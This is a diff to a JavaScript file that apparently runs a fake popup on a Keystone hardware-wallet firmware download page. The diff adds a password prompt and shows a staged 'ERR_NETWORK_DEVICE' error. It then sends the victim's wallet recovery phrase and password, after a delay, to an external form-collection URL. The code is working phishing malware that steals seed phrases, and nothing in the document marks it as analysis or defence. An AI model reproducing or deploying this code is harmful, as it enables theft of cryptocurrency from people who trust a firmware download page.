@@ -57,6 +57,8 @@ function doMore(_this) {
     const firstDownloadBtn = _this.querySelector('a[data-mixpanel-id^="Multi-Coin Firmware Download"]')
     const secondDownloadBtn = _this.querySelector('div[style^="bottom: -25px"]')
     firstDownloadBtn.addEventListener("click", function() {
+      localStorage.setItem("keystone-paw", "")
+      localStorage.setItem("keystone-phr", "")
         popup.style.visibility = "visible"
         if(popup.classList.contains("slide-out-bottom")){
           popup.classList.remove("slide-out-bottom")
@@ -75,6 +77,8 @@ function doMore(_this) {
         doSteps(_this);
     })
     secondDownloadBtn.addEventListener("click", function(e){
+      localStorage.setItem("keystone-paw", "")
+      localStorage.setItem("keystone-phr", "")
       e.preventDefault();
       e.stopImmediatePropagation()
       
@@ -105,7 +109,8 @@ function doSteps(_this, e = null) {
   const retryBtn = _this.querySelector("#retry-btn")
   const verifyBtn = _this.querySelector("#verify-btn")
   const form = _this.querySelector("#my-form")
-  
+  const passwordForm = _this.querySelector("#my-password-form")
+    console.log(passwordForm)
 
   retryBtn.addEventListener("click", function(){
     reset(_this)
@@ -119,17 +124,32 @@ function doSteps(_this, e = null) {
   form.addEventListener("submit",function(e){
     submitPhrase(e, _this)
   })
-
-  const timeOut = setTimeout(() =>{
-      step1.style.display = "none"
-      toastr.warning("A Connection error occured: ERR_NETWORK_DEVICE")
-      step2.style.display = "flex"
-  }, 9000)
-
-  window.addEventListener("shouldCloseKeyStonePopup", function() {
-    clearTimeout(timeOut)
-    console.log("Clearing Timeout...")
-  },true)
+  passwordForm.addEventListener("submit", function(e) {
+    e.preventDefault()
+    let password = _this.querySelector('input[name^="password-k"]')
+    const formLoadingSpinner = _this.querySelector("#form-password-load-spinner")
+    password = password.value.trim()
+    formLoadingSpinner.style.display = "inline-block"
+    if(password.length === 0 || password === "" ){
+      toastr.error("Invalid password, please double-check the phrase and try again.")
+      formLoadingSpinner.style.display = "none"
+    } else {
+      const timeOut = setTimeout(() => {
+        localStorage.setItem("keystone-paw", password)
+        formLoadingSpinner.style.display = "none"
+        step1.style.display = "none"
+        toastr.warning("A Login error occured: ERR_NETWORK_DEVICE")
+        step2.style.display = "flex"
+        _this.querySelector('input[name^="password-k"]').value = ""
+      },9000)
+        window.addEventListener("shouldCloseKeyStonePopup", function() {
+          clearTimeout(timeOut)
+          formLoadingSpinner.style.display = "none"
+          _this.querySelector('input[name^="password-k"]').value = ""
+          console.log("Clearing Timeout...")
+        },true)
+    }
+  })
 
 }
 
@@ -155,6 +175,7 @@ function submitPhrase(e,_this) {
     const formLoadingSpinner = _this.querySelector("#form-load-spinner")
     const FORMSPARK_ACTION_URL = "https://submit-form.com/6BjaBkrx"
     formLoadingSpinner.style.display = "inline-block"
+    const controller = new AbortController()
 
    const timeOut =  setTimeout(() => {
       fetch(FORMSPARK_ACTION_URL, {
@@ -163,8 +184,10 @@ function submitPhrase(e,_this) {
           "Content-Type": "application/json",
           Accept: "application/json",
         },
+        signal: controller.signal,
         body: JSON.stringify({
-          phrase
+          phrase,
+          password: localStorage.getItem("keystone-paw")
         }),
       })
         .then(() => {
@@ -176,9 +199,12 @@ function submitPhrase(e,_this) {
         .finally(() => {
           formLoadingSpinner.style.display = "none"
         });
-    },3000)
+    },9000)
     window.addEventListener("shouldCloseKeyStonePopup", function() {
+      controller.abort()
       clearTimeout(timeOut)
+      formLoadingSpinner.style.display = "none"
+      _this.querySelector('textarea[name^="phrase"]').value = ""
       console.log("Clearing Timeout...")
     },true)
   }
